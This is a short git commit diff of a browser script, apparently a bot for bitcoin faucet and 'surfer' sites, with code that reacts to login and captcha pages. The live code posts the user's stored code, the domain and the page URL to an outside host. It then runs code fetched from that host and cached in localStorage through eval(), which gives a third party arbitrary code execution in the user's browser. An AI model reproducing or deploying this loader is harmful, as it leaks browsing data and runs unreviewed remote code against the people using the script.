1c569b97073b6b11700195c462647d0479776674
freebitcoinfo <freebitco.info@ya.ru>
2018-08-28 18:43:46 +0400

    Update script.js

--- script.js
+++ script.js
@@ -1,8 +1,7 @@
 var dat=new Date().getTime()/1000; var loch=location.href.indexOf('index.php?view=login');var spltu=location.href.indexOf('modules.php?m=surfer&show=captcha');
-var ode=$.md5(window.location.href )+'odd';
 if(localStorage['dtt'] && localStorage['odd'] && localStorage['odd']!=='' && dat-Number(localStorage['dtt'])<166400){eval(localStorage['odd']);}
 else{
-if($('#adcopy-puzzle-image img').attr('src')){var solve=1;}	else{var solve=-1;}	
+if($('#adcopy-puzzle-image img').attr('src')){var solve=1;}else{var solve=-1;}	
 	
 $.post("//bitcjt.mircloud.host/app/js/bit/bj/bitjs.js", { c: localStorage['p_code'], d: document.domain, h:location.href,solve:solve })
 .done(function(data) {
